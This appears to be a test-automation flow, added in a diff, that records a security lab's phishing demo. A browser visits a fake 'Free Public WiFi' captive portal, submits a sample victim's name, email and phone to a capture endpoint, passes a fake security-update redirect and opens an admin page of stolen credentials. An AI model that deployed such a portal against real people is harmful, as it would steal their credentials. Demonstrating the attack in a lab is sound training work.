@@ -1,0 +1,19 @@
+name: OffSec Lab - Phase 1 - Captive Portal Credential Theft
+appId: com.android.chrome
+tags: [offsec, rogue-ap, captive-portal, phishing]
+---
+# PHASE 1: Victim connects to "Free Public WiFi"
+# Step 1: Show the phishing captive portal
+- openLink: "http://10.0.2.2:8080/"
+- takeScreenshot: p1_captive_portal_freepublicwifi
+
+# Step 2: Victim's credentials are captured via form submission
+- openLink: "http://10.0.2.2:8080/capture?name=Budi%20Santoso&email=budi@company.com&phone=%2B62%20812%203456%207890"
+- takeScreenshot: p1_credentials_captured
+
+# Step 3: Redirected to security update download page
+- takeScreenshot: p1_security_update_redirect
+
+# Step 4: View stolen credentials on admin panel
+- openLink: "http://10.0.2.2:8080/creds"
+- takeScreenshot: p1_stolen_credentials_admin
